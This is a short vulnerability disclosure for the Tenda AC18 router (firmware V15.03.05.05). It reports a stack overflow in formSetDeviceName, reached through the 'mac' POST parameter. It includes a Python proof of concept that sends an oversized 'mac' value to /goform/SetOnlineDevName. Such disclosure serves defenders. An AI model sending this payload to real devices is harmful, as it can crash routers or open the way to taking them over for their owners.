## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetDeviceName` function. The `v8` variable receives the `mac` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `mac` can trigger this security vulnerability.

![image-20240306171243036](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306171243036.png)

![image-20240306171344896](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306171344896.png)

![image-20240306171258485](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306171258485.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*1000

data = {"mac": payload,"devName": 1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240306171400963](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306171400963.png)
